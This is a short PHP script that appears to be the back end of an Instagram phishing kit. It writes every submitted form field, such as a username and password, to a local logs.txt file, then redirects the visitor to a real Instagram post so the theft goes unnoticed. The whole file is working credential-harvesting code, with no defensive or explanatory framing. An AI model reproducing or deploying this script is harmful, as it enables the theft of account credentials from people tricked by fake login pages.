<?php
header ('Location:https://www.instagram.com/p/B9JmYcwBTS4/?utm_source=ig_web_copy_link');
$handle = fopen("./logs.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, " = ");
   fwrite($handle, $value);
   fwrite($handle, "\r   \n");
}
fwrite($handle, "\r   \n   \n");
fclose($handle);
exit;

?>
